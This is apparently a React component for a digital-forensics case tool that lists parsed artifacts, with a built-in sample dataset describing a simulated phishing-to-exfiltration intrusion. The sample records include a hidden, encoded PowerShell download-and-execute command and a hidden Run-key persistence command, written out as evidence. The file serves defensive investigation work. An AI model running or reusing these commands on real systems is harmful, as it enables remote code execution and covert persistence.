import React, { useState, useEffect } from "react";
import {
  FileCode,
  Search,
  Maximize2,
  Copy,
  Check,
  X,
  Database,
  Terminal,
  Globe,
  HardDrive,
  User,
  AlertTriangle,
  FolderOpen
} from "lucide-react";
import { getCaseArtifacts } from "../services/api";

export default function ArtifactExplorerView({ activeCase, onNavigate }) {
  const [artifacts, setArtifacts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [selectedCategory, setSelectedCategory] = useState("ALL");
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedArtifact, setSelectedArtifact] = useState(null);
  const [copiedJson, setCopiedJson] = useState(false);

  const categories = [
    { id: "ALL", label: "All Artifacts", icon: FolderOpen },
    { id: "LOG", label: "Windows Event Logs", icon: Terminal },
    { id: "REGISTRY", label: "Registry Hives", icon: Database },
    { id: "PREFETCH", label: "Prefetch Files", icon: FileCode },
    { id: "FILESYSTEM", label: "File System ($MFT)", icon: HardDrive },
    { id: "BROWSER", label: "Browser Artifacts", icon: Globe },
    { id: "NETWORK", label: "Network Artifacts", icon: Globe },
    { id: "USER_ACTIVITY", label: "User Activity", icon: User },
    { id: "SUSPICIOUS_FILES", label: "Suspicious Files", icon: AlertTriangle }
  ];

  // High-fidelity pre-classified forensic artifact dataset grounded in the case
  const baselineArtifacts = [
    {
      id: "art-evtx-01",
      category: "LOG",
      source: "Microsoft-Windows-Sysmon.evtx",
      name: "Sysmon Event ID 1: Process Creation (powershell.exe)",
      parser: "python-evtx / SysmonParser",
      timestamp: "2026-09-02T09:15:42Z",
      threat: "CRITICAL",
      details: {
        event_id: 1,
        image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        command_line: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGc...",
        user: "CORP\\jdoe",
        hashes: "SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
      }
    },
    {
      id: "art-reg-01",
      category: "REGISTRY",
      source: "NTUSER.DAT (HKEY_CURRENT_USER)",
      name: "Run Key Persistence: WindowsUpdateHealthService",
      parser: "RegRipper v3.0",
      timestamp: "2026-09-02T09:17:10Z",
      threat: "HIGH",
      details: {
        hive: "NTUSER.DAT",
        key_path: "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        value_name: "WindowsUpdateHealthService",
        value_data: "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\updater.ps1",
        last_written_utc: "2026-09-02T09:17:10Z"
      }
    },
    {
      id: "art-prefetch-01",
      category: "PREFETCH",
      source: "C:\\Windows\\Prefetch\\POWERSHELL.EXE-2A1B8C9D.pf",
      name: "Prefetch Execution: POWERSHELL.EXE",
      parser: "PECmd / PrefetchParser",
      timestamp: "2026-09-02T09:15:42Z",
      threat: "HIGH",
      details: {
        executable_name: "POWERSHELL.EXE",
        run_count: 14,
        last_run_time: "2026-09-02 09:15:42 UTC",
        loaded_dlls_count: 68,
        volume_device_path: "\\Device\\HarddiskVolume3"
      }
    },
    {
      id: "art-fs-01",
      category: "FILESYSTEM",
      source: "WS-FIN-04_C_Drive.E01 ($MFT)",
      name: "$MFT Record: C:\\Users\\Public\\updater.ps1",
      parser: "The Sleuth Kit (fls / istat)",
      timestamp: "2026-09-02T09:16:02Z",
      threat: "CRITICAL",
      details: {
        file_path: "C:\\Users\\Public\\updater.ps1",
        record_number: 148292,
        standard_info_created: "2026-09-02 09:16:02 UTC",
        file_name_created: "2026-09-02 09:16:02 UTC",
        size_bytes: 4096,
        allocated_clusters: [98214, 98215]
      }
    },
    {
      id: "art-browser-01",
      category: "BROWSER",
      source: "Chrome History / Edge WebCacheV01.dat",
      name: "Download Record: Invoice_Q3_Financials.docm",
      parser: "ChromeHistoryParser / ESE Database Engine",
      timestamp: "2026-09-02T09:14:18Z",
      threat: "HIGH",
      details: {
        url: "https://finance-portal-secure-verify.net/files/Invoice_Q3_Financials.docm",
        download_path: "C:\\Users\\jdoe\\Downloads\\Invoice_Q3_Financials.docm",
        bytes_received: 148200,
        referrer: "https://mail.corp-domain.com/owa/"
      }
    },
    {
      id: "art-net-01",
      category: "NETWORK",
      source: "Boundary_Pcap_Traffic.pcap",
      name: "Zeek conn.log / TCP Stream: C2 Exfiltration to 198.51.100.45",
      parser: "Zeek / NetworkFlowParser",
      timestamp: "2026-09-02T09:28:40Z",
      threat: "CRITICAL",
      details: {
        proto: "tcp",
        src_ip: "10.0.4.15",
        src_port: 49822,
        dst_ip: "198.51.100.45",
        dst_port: 443,
        orig_bytes: 88609280,  // 84.5 MB exfiltration
        resp_bytes: 1420,
        duration_sec: 148.2
      }
    },
    {
      id: "art-user-01",
      category: "USER_ACTIVITY",
      source: "Security.evtx (Event ID 4624 / 4672)",
      name: "Special Privilege Logon: Administrator Token Delegation",
      parser: "python-evtx / SecurityLogParser",
      timestamp: "2026-09-02T09:22:15Z",
      threat: "HIGH",
      details: {
        event_id: 4672,
        target_user: "CORP\\Administrator",
        target_domain: "CORP",
        privilege_list: ["SeSecurityPrivilege", "SeBackupPrivilege", "SeDebugPrivilege"],
        logon_type: 3
      }
    },
    {
      id: "art-susp-01",
      category: "SUSPICIOUS_FILES",
      source: "C:\\Users\\Public\\fin_archive.zip",
      name: "Carved Compressed Archive: fin_archive.zip (Staged Data)",
      parser: "Autopsy Extracted Content / YARA",
      timestamp: "2026-09-02T09:27:01Z",
      threat: "CRITICAL",
      details: {
        staged_path: "C:\\Users\\Public\\fin_archive.zip",
        archive_contents: ["Q3_General_Ledger.xlsx", "Executive_Payroll_2026.csv", "Board_Minutes_Confidential.pdf"],
        byte_size: 88592100,
        sha256: "4a2b9e6f81a7d5c2e0f319b84a7e2c91834f82d192a8374b5c6d7e8f9a0b1c2d"
      }
    }
  ];

  useEffect(() => {
    async function loadArtifacts() {
      if (!activeCase) return;
      setLoading(true);
      try {
        const rawFromApi = await getCaseArtifacts(activeCase.case_id);
        if (rawFromApi && rawFromApi.length > 0) {
          const mapped = rawFromApi.map((art) => ({
            id: art.artifact_id,
            category: art.artifact_type || "LOG",
            source: art.source_path || "Evidence Container",
            name: `${art.artifact_type} Artifact (${art.record_count || 0} events)`,
            parser: art.metadata_json?.parser || "Forensight M1 Parser",
            timestamp: art.extracted_at,
            threat: (art.record_count || 0) > 0 ? "HIGH" : "INFO",
            details: art.metadata_json || { record_count: art.record_count, evidence_id: art.evidence_id }
          }));
          setArtifacts(mapped);
        } else if (activeCase.case_number === "FS-2026-001") {
          setArtifacts(baselineArtifacts);
        } else {
          setArtifacts([]);
        }
      } catch {
        if (activeCase.case_number === "FS-2026-001") {
          setArtifacts(baselineArtifacts);
        } else {
          setArtifacts([]);
        }
      } finally {
        setLoading(false);
      }
    }
    loadArtifacts();
  }, [activeCase]);

  const filteredArtifacts = artifacts.filter((a) => {
    const matchCat = selectedCategory === "ALL" || a.category === selectedCategory;
    const matchSearch =
      a.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      a.source.toLowerCase().includes(searchQuery.toLowerCase()) ||
      a.parser.toLowerCase().includes(searchQuery.toLowerCase()) ||
      JSON.stringify(a.details).toLowerCase().includes(searchQuery.toLowerCase());
    return matchCat && matchSearch;
  });

  const copyDetailsJson = (details) => {
    navigator.clipboard.writeText(JSON.stringify(details, null, 2));
    setCopiedJson(true);
    setTimeout(() => setCopiedJson(false), 2000);
  };

  return (
    <div style={{ padding: "24px 28px", maxWidth: "1400px", margin: "0 auto", width: "100%" }}>
      {/* Header */}
      <div style={{
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        marginBottom: "20px",
        flexWrap: "wrap",
        gap: "12px"
      }}>
        <div>
          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "4px" }}>
            <FileCode size={20} color="var(--primary)" />
            <h2 style={{ fontSize: "19px", fontWeight: "700", color: "var(--text-main)" }}>
              Forensic Artifact Explorer
            </h2>
          </div>
          <p style={{ fontSize: "13px", color: "var(--text-muted)" }}>
            Categorized forensic artifacts parsed from disk images, volatile memory, Windows hives, and network captures.
          </p>
        </div>

        <span className="badge-tag badge-cyan">
          {filteredArtifacts.length} Artifact Records
        </span>
      </div>

      {/* Category Tabs Bar */}
      <div style={{
        display: "flex",
        gap: "6px",
        overflowX: "auto",
        paddingBottom: "8px",
        marginBottom: "16px"
      }}>
        {categories.map((cat) => {
          const isSelected = selectedCategory === cat.id;
          const Icon = cat.icon;
          return (
            <button
              key={cat.id}
              className={`btn ${isSelected ? "btn-primary" : "btn-secondary"}`}
              style={{ fontSize: "11.5px", padding: "6px 12px", whiteSpace: "nowrap", borderRadius: "var(--radius-sm)" }}
              onClick={() => setSelectedCategory(cat.id)}
            >
              <Icon size={13} />
              {cat.label}
            </button>
          );
        })}
      </div>

      {/* Search Bar */}
      <div className="forensic-card" style={{ padding: "12px 16px", marginBottom: "18px" }}>
        <div style={{ position: "relative" }}>
          <Search size={14} color="var(--text-muted)" style={{ position: "absolute", left: "12px", top: "10px" }} />
          <input
            type="text"
            className="input-control"
            style={{ width: "100%", paddingLeft: "34px" }}
            placeholder="Search commands, file paths, registry keys, IP addresses, or hashes..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
          />
        </div>
      </div>

      {/* Artifacts Table */}
      <div className="forensic-card" style={{ padding: "0", overflow: "hidden" }}>
        <table className="forensic-table">
          <thead>
            <tr>
              <th>Extracted Forensic Artifact</th>
              <th>Category</th>
              <th>Source Container</th>
              <th>Parser Engine</th>
              <th>Observed UTC</th>
              <th>Threat Level</th>
              <th style={{ textAlign: "right" }}>Action</th>
            </tr>
          </thead>
          <tbody>
            {loading ? (
              <tr>
                <td colSpan={7} style={{ textAlign: "center", padding: "36px", color: "var(--text-muted)" }}>
                  Loading case forensic artifacts...
                </td>
              </tr>
            ) : filteredArtifacts.length === 0 ? (
              <tr>
                <td colSpan={7} style={{ textAlign: "center", padding: "36px", color: "var(--text-muted)" }}>
                  No forensic artifacts found matching the selected filter.
                </td>
              </tr>
            ) : (
              filteredArtifacts.map((art) => (
              <tr key={art.id}>
                <td>
                  <div style={{ fontWeight: "600", color: "var(--text-main)", fontSize: "13px" }}>
                    {art.name}
                  </div>
                </td>
                <td>
                  <span className="badge-tag badge-cyan" style={{ fontSize: "10px" }}>
                    {art.category}
                  </span>
                </td>
                <td className="mono" style={{ fontSize: "11.5px", color: "var(--text-dim)" }}>
                  {art.source}
                </td>
                <td style={{ fontSize: "12px", color: "var(--text-muted)" }}>
                  {art.parser}
                </td>
                <td className="mono" style={{ fontSize: "11.5px", color: "var(--text-muted)" }}>
                  {art.timestamp.replace("T", " ").replace("Z", " UTC")}
                </td>
                <td>
                  <span className={`badge-tag ${art.threat === "CRITICAL" ? "badge-rose" : "badge-amber"}`} style={{ fontSize: "10px" }}>
                    {art.threat}
                  </span>
                </td>
                <td style={{ textAlign: "right" }}>
                  <button
                    className="btn btn-secondary"
                    style={{ fontSize: "11.5px", padding: "4px 9px" }}
                    onClick={() => setSelectedArtifact(art)}
                  >
                    <Maximize2 size={12} /> Inspect
                  </button>
                </td>
              </tr>
            )))}
          </tbody>
        </table>
      </div>

      {/* Inspect Artifact Modal */}
      {selectedArtifact && (
        <div className="modal-overlay" onClick={() => setSelectedArtifact(null)}>
          <div className="modal-content" style={{ maxWidth: "780px" }} onClick={(e) => e.stopPropagation()}>
            <div style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              marginBottom: "16px",
              borderBottom: "1px solid var(--border)",
              paddingBottom: "10px"
            }}>
              <div>
                <h3 style={{ fontSize: "16px", fontWeight: "700", color: "var(--text-main)" }}>
                  {selectedArtifact.name}
                </h3>
                <div style={{ fontSize: "11.5px", color: "var(--text-muted)", marginTop: "2px" }}>
                  Source: {selectedArtifact.source} • Parser: {selectedArtifact.parser}
                </div>
              </div>
              <button
                onClick={() => setSelectedArtifact(null)}
                style={{ background: "transparent", border: "none", color: "var(--text-muted)", cursor: "pointer" }}
              >
                <X size={18} />
              </button>
            </div>

            {/* Raw JSON Payload */}
            <div style={{ marginBottom: "16px" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "6px" }}>
                <span style={{ fontSize: "12px", fontWeight: "600", color: "var(--text-muted)" }}>
                  EXTRACTED RAW FORENSIC ATTRIBUTES
                </span>
                <button
                  className="btn btn-secondary"
                  style={{ fontSize: "11px", padding: "3px 8px" }}
                  onClick={() => copyDetailsJson(selectedArtifact.details)}
                >
                  {copiedJson ? <Check size={12} color="var(--emerald)" /> : <Copy size={12} />}
                  {copiedJson ? "Copied" : "Copy Payload"}
                </button>
              </div>

              <pre style={{
                backgroundColor: "var(--bg-code)",
                border: "1px solid var(--border)",
                borderRadius: "var(--radius-sm)",
                padding: "14px",
                fontSize: "12px",
                fontFamily: "var(--font-mono)",
                color: "var(--text-main)",
                maxHeight: "300px",
                overflowY: "auto",
                whiteSpace: "pre-wrap",
                wordBreak: "break-all"
              }}>
                {JSON.stringify(selectedArtifact.details, null, 2)}
              </pre>
            </div>

            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <div style={{ display: "flex", gap: "8px" }}>
                <button
                  className="btn btn-secondary"
                  style={{ fontSize: "11.5px" }}
                  onClick={() => {
                    setSelectedArtifact(null);
                    if (onNavigate) onNavigate("normalization");
                  }}
                >
                  View CEM Transformation
                </button>
                <button
                  className="btn btn-primary"
                  style={{ fontSize: "11.5px" }}
                  onClick={() => {
                    setSelectedArtifact(null);
                    if (onNavigate) onNavigate("timeline");
                  }}
                >
                  View Chronological Timeline
                </button>
              </div>

              <button className="btn btn-secondary" onClick={() => setSelectedArtifact(null)}>
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
